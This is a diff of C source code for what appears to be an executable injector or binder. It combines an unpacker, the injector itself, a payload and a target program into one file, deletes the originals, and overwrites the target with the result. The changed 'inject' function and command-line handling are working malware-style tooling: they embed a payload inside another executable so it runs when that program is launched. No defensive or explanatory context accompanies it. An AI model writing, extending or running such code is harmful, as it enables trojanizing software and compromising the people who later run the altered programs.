@@ -12,51 +12,65 @@
 #endif
 
 
-bool inject(const char *unpacker_path, const char *self_path, const char *target_path) {
-    // fuck race conditions tbh, i need this to work; i need a name
-    // and not just a pointer to a handle or whatever.
-    char *tmp_path = tempnam(NULL, "");
-    if (tmp_path == NULL)
+bool inject(
+    const char *unpacker,
+    const char *injector,
+    const char *payload,
+    const char *target
+) {
+    FILE *tmp_file = tmpfile();
+    if (tmp_file == NULL) {
+        perror("Couldn't create tmpfile().");
+        return false;
+    }
+
+    if (!read_path_into_fp(unpacker, tmp_file, -1))
         return false;
 
-    FILE *tmp_file = fopen(tmp_path, "wb");
-    if (tmp_file == NULL)
+    if (remove(unpacker))
         return false;
     
-    if (!read_path_into_fp(unpacker_path, tmp_file, -1))
+    if (!read_path_into_fp(injector, tmp_file, -1))
         return false;
 
-    if (remove(unpacker_path))
+    // This can't be done here, unpacker will take care of this
+    // if (remove(injector))
+    //     return false;
+
+    if (!read_path_into_fp(payload, tmp_file, -1))
+        return false;
+
+    if (remove(payload))
         return false;
     
-    if (!read_path_into_fp(self_path, tmp_file, -1))
+    if (!read_path_into_fp(target, tmp_file, -1))
         return false;
-    
-    if (!read_path_into_fp(target_path, tmp_file, -1))
+
+    if (remove(target))
+        return false;
+
+    if (fseek(tmp_file, 0, SEEK_SET) == -1) {
+        perror("Couldn't seek to beginning of tmpfile() for copying");
+        return false;
+    }
+
+    if (!read_fp_into_path(tmp_file, target, -1))
         return false;
 
     if (fclose(tmp_file) == EOF)
         return false;
 
-    if (remove(target_path))
-        return false;
-
-    if (rename(tmp_path, target_path))
-        return false;
-
-    free(tmp_path);
-    
     return true;
 }
 
 
 int main(int argc, char *argv[]) {
-    if (argc < 3) {
-        fprintf(stderr, "ValueError: missing UNPACKER and TARGET executables.");
+    if (argc < 4) {
+        fprintf(stderr, "Syntax: '%s' UNPACKER PAYLOAD TARGET", argv[0]);
         return 1;
     }
 
-    if (!inject(argv[1], argv[0], argv[2])) {
+    if (!inject(argv[1], argv[0], argv[2], argv[3])) {
         perror(strerror(errno));
         return 1;
     }
